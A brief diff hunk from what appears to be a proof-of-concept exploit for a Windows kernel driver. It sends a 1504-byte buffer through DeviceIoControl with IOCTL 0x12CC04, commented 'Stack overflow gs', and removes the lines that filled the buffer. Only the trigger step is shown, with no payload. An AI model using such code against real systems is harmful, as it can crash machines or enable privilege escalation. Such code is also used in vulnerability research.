@@ -11,8 +11,6 @@ int main() {
 		return -1;
 	}
 	char buf[1504]{};
-	memset(buf,0x3, 1504);
-	buf[1] = 2;
 	//Stack overflow gs
 	DeviceIoControl(hDriver, 0x12CC04, buf, 1504, 0, 0, &dw, NULL);
 
